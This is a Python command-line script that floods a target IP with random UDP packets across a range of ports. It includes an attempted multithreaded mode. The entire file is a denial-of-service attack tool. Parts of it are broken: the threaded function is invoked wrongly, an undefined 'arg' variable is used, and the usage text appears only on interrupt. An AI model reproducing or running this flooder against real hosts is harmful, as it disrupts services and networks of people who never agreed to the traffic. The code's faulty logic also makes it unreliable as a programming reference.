#import socket
from socket import socket, AF_INET, SOCK_DGRAM
from random import _urandom
from sys import argv

from joblib import Parallel, delayed
from multiprocessing import Pool


def to_KB(B):
    return B/2**10

def udp_flood(ip, port_range, verbose = False):
    S = socket(AF_INET, SOCK_DGRAM)
    start = int(port_range[0])
    end = int(port_range[1])

    j = 1
    pkt_length = 1024
    while 1:
        try:
            pkt = _urandom(pkt_length)

            [S.sendto(pkt,(ip,start)) for start in range(start,end)]

            if verbose: print('Flooded ports %d - %d, %d times' % (start, end, j)) 
            else: continue
            j += 1 
        except KeyboardInterrupt:
            exit()

    return
def super_flood(ip, ports, threads):
    func = udp_flood(ipv4, ports, False) 
    Parallel(n_jobs = threads, prefer='threads')(delayed(func))

if __name__ == '__main__':
    try:
        ipv4 = argv[1]
        ports = argv[2].split('-')
        if len(argv) == 3: udp_flood(ipv4,ports,True)
        else: 
            threads = arg[3]
            super_flood(ipv4, ports, threads)

    except KeyboardInterrupt:
        print('pass in arguments as: <ip> <start_port> <end_port> <threads>')
